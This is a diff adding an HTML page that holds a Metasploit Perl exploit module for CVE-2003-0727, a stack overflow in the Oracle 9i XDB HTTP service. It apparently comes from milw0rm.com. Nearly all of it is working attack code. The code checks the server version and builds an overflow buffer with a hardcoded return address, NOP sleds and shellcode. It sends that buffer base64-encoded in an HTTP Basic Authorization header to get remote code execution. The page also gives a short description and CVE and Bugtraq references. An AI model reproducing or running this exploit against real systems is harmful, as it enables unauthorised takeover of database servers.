@@ -1,0 +1,171 @@
+<html>
+<head>
+<title>Oracle 9.2.0.1 Universal XDB HTTP Pass Overflow Exploit</title>
+<pre>
+
+##
+# This file is part of the Metasploit Framework and may be redistributed
+# according to the licenses defined in the Authors field below. In the
+# case of an unknown or missing license, this file defaults to the same
+# license as the core Framework (dual GPLv2 and Artistic). The latest
+# version of the Framework can always be obtained from metasploit.com.
+##
+
+package Msf::Exploit::oracle9i_xdb_http;
+use base &quot;Msf::Exploit&quot;;
+use strict;
+use Pex::Text;
+
+my $advanced = { };
+
+my $info =
+  {
+
+	'Name'  =&gt; 'Oracle 9i XDB HTTP PASS Overflow (win32)',
+	'Version'  =&gt; '$Revision: 1.1 $',
+	'Authors' =&gt; [ 'y0 [at] w00t-shell.net', ],
+	'Arch'  =&gt; [ 'x86' ],
+	'OS'    =&gt; [ 'win32', 'winnt', 'win2000', 'winxp', 'win2003'],
+	'Priv'  =&gt; 0,
+	'UserOpts'  =&gt;
+	  {
+		'RHOST' =&gt; [1, 'ADDR', 'The target address'],
+		'RPORT' =&gt; [1, 'PORT', 'The target port', 8080],
+		'SSL'   =&gt; [0, 'BOOL', 'Use SSL'],
+	  },
+	  
+	'AutoOpts' =&gt; { 'EXITFUNC' =&gt; 'thread' },
+	'Payload' =&gt;
+	  {
+		'Space'     =&gt; 450,
+		'BadChars'  =&gt; &quot;\x00&quot;,
+		'Prepend'   =&gt; &quot;\x81\xc4\xff\xef\xff\xff\x44&quot;,
+		'Keys'      =&gt; ['+ws2ord'],
+	  },
+
+	'Description'  =&gt; Pex::Text::Freeform(qq{
+		This module exploits a stack overflow in the authorization
+		code of the Oracle 9i HTTP XDB service. David Litchfield, 
+        has illustrated multiple vulnerabilities in the Oracle
+        9i XML Database (XDB), during a seminar on &quot;Variations
+        in exploit methods between Linux and Windows&quot; presented
+        at the Blackhat conference. 
+}),
+
+	'Refs'  =&gt;   [
+		['BID', '8375'],
+		['CVE', '2003-0727'],
+		['URL', 'http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf']
+	  ],
+
+	'DefaultTarget' =&gt; 0,
+	'Targets' =&gt; [
+
+		['Oracle 9.2.0.1 Universal', 0x60616d46],
+
+	  ],
+
+	'Keys' =&gt; ['oracle'],
+
+	'DisclosureDate' =&gt; 'Aug 18 2003',
+  };
+
+sub new {
+	my $class = shift;
+	my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);
+	return($self);
+}
+
+sub Check {
+	my ($self) = @_;
+	my $target_host = $self-&gt;GetVar('RHOST');
+	my $target_port = $self-&gt;GetVar('RPORT');
+
+	my $s = Msf::Socket::Tcp-&gt;new
+	  (
+		'PeerAddr'  =&gt; $target_host,
+		'PeerPort'  =&gt; $target_port,
+		'LocalPort' =&gt; $self-&gt;GetVar('CPORT'),
+		'SSL'       =&gt; $self-&gt;GetVar('SSL'),
+	  );
+	if ($s-&gt;IsError) {
+		$self-&gt;PrintLine('[*] Error creating socket: ' . $s-&gt;GetError);
+		return $self-&gt;CheckCode('Connect');
+	}
+
+	$s-&gt;Send(&quot;GET / HTTP/1.0\r\n\r\n&quot;);
+	my $res = $s-&gt;Recv(-1, 20);
+	$s-&gt;Close();
+
+	if ($res !~ /9\.2\.0\.1\.0/) {
+		$self-&gt;PrintLine(&quot;[*] This server does not appear to be vulnerable.&quot;);
+		return $self-&gt;CheckCode('Safe');
+	}
+
+	$self-&gt;PrintLine(&quot;[*] Vulnerable installation detected :-)&quot;);
+	return $self-&gt;CheckCode('Detected');
+}
+
+sub Exploit
+{
+	my $self = shift;
+	my $target_host = $self-&gt;GetVar('RHOST');
+	my $target_port = $self-&gt;GetVar('RPORT');
+	my $target_idx  = $self-&gt;GetVar('TARGET');
+	my $offset      = $self-&gt;GetVar('OFFSET');
+	my $shellcode   = $self-&gt;GetVar('EncodedPayload')-&gt;Payload;
+	my $target = $self-&gt;Targets-&gt;[$target_idx];
+
+	if (! $self-&gt;InitNops(128)) {
+		$self-&gt;PrintLine(&quot;[*] Failed to initialize the nop module.&quot;);
+		return;
+	}
+
+	my $splat =
+	  &quot;meta:&quot;. Pex::Text::LowerCaseText(442). &quot;\xeb\x64\x42\x42&quot;.
+	  pack('V', $target-&gt;[1]). &quot;wwwwoooottttsssshhhhllll&quot;.
+	  $self-&gt;MakeNops(242). &quot;\xeb\x10&quot;. $self-&gt;MakeNops(109). $shellcode;
+
+	my $sploit =
+	  &quot;GET / HTTP/1.1&quot;. &quot;\r\n&quot;.
+	  &quot;Host: $target_host:$target_port&quot;. &quot;\r\n&quot;.
+	  &quot;User-Agent: Mozilla/5.0 (X11; U; Linux i686;&quot;.
+	  &quot;en-US; rv:1.7.12) Gecko/20050923&quot;. &quot;\r\n&quot;.
+	  &quot;Accept: text/xml,application/xml,application&quot;.
+	  &quot;/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,&quot;.
+	  &quot;image/png,*/*;q=0.5&quot;. &quot;\r\n&quot;.
+	  &quot;Accept-Language: en-us,en;q=0.5&quot;. &quot;\r\n&quot;.
+	  &quot;Accept-Encoding: gzip,deflate&quot;. &quot;\r\n&quot;.
+	  &quot;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7&quot;. &quot;\r\n&quot;.
+	  &quot;Keep-Alive: 300&quot;. &quot;\r\n&quot;.
+	  &quot;Connection: keep-alive&quot;. &quot;\r\n&quot;.
+	  &quot;Authorization: Basic &quot;. Pex::Text::Base64Encode($splat, '').
+	  &quot;\r\n\r\n&quot;;
+
+	$self-&gt;PrintLine(sprintf(&quot;[*] Trying to exploit target %s 0x%.8x&quot;, $target-&gt;[0], $target-&gt;[1]));
+
+	my $s = Msf::Socket::Tcp-&gt;new
+	  (
+		'PeerAddr'  =&gt; $target_host,
+		'PeerPort'  =&gt; $target_port,
+		'LocalPort' =&gt; $self-&gt;GetVar('CPORT'),
+		'SSL'       =&gt; $self-&gt;GetVar('SSL'),
+	  );
+	if ($s-&gt;IsError) {
+		$self-&gt;PrintLine('[*] Error creating socket: ' . $s-&gt;GetError);
+		return;
+	}
+
+	$s-&gt;Send($sploit);
+	$self-&gt;Handler($s);
+	$s-&gt;Close();
+	return;
+}
+
+1;
+
+
+# milw0rm.com [2005-12-08]
+</pre>
+</html>
+
